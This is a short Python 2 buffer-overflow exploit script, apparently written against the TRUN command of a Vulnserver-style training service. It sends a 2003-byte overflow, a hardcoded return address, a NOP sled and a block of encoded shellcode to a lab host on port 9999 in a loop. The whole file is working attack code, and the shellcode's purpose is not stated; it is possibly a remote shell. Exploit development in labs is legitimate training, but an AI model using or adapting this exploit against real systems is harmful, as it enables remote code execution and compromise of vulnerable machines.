import sys, socket

shellcode =(
"\xda\xdd\xb8\x1a\x78\x28\x9f\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xf1\x84\xca\x6a\xf9\x9d\x89"
"\x95\x01\x5e\xee\x1c\xe4\x6f\x2e\x7a\x6d\xdf\x9e\x08\x23\xec"
"\x55\x5c\xd7\x67\x1b\x49\xd8\xc0\x96\xaf\xd7\xd1\x8b\x8c\x76"
"\x52\xd6\xc0\x58\x6b\x19\x15\x99\xac\x44\xd4\xcb\x65\x02\x4b"
"\xfb\x02\x5e\x50\x70\x58\x4e\xd0\x65\x29\x71\xf1\x38\x21\x28"
"\xd1\xbb\xe6\x40\x58\xa3\xeb\x6d\x12\x58\xdf\x1a\xa5\x88\x11"
"\xe2\x0a\xf5\x9d\x11\x52\x32\x19\xca\x21\x4a\x59\x77\x32\x89"
"\x23\xa3\xb7\x09\x83\x20\x6f\xf5\x35\xe4\xf6\x7e\x39\x41\x7c"
"\xd8\x5e\x54\x51\x53\x5a\xdd\x54\xb3\xea\xa5\x72\x17\xb6\x7e"
"\x1a\x0e\x12\xd0\x23\x50\xfd\x8d\x81\x1b\x10\xd9\xbb\x46\x7d"
"\x2e\xf6\x78\x7d\x38\x81\x0b\x4f\xe7\x39\x83\xe3\x60\xe4\x54"
"\x03\x5b\x50\xca\xfa\x64\xa1\xc3\x38\x30\xf1\x7b\xe8\x39\x9a"
"\x7b\x15\xec\x0d\x2b\xb9\x5f\xee\x9b\x79\x30\x86\xf1\x75\x6f"
"\xb6\xfa\x5f\x18\x5d\x01\x08\x2d\xa2\x0b\xc7\x59\xa0\x0b\xc6"
"\xc5\x2d\xed\x82\xe5\x7b\xa6\x3a\x9f\x21\x3c\xda\x60\xfc\x39"
"\xdc\xeb\xf3\xbe\x93\x1b\x79\xac\x44\xec\x34\x8e\xc3\xf3\xe2"
"\xa6\x88\x66\x69\x36\xc6\x9a\x26\x61\x8f\x6d\x3f\xe7\x3d\xd7"
"\xe9\x15\xbc\x81\xd2\x9d\x1b\x72\xdc\x1c\xe9\xce\xfa\x0e\x37"
"\xce\x46\x7a\xe7\x99\x10\xd4\x41\x70\xd3\x8e\x1b\x2f\xbd\x46"
"\xdd\x03\x7e\x10\xe2\x49\x08\xfc\x53\x24\x4d\x03\x5b\xa0\x59"
"\x7c\x81\x50\xa5\x57\x01\x70\x44\x7d\x7c\x19\xd1\x14\x3d\x44"
"\xe2\xc3\x02\x71\x61\xe1\xfa\x86\x79\x80\xff\xc3\x3d\x79\x72"
"\x5b\xa8\x7d\x21\x5c\xf9")

buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + shellcode

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('10.0.2.7',9999))

        s.send(('TRUN /.:/' + buffer))
        s.close()

    except:
        print "Fuzzing crashed at %s bytes" %str(len(buffer))
        sys.exit()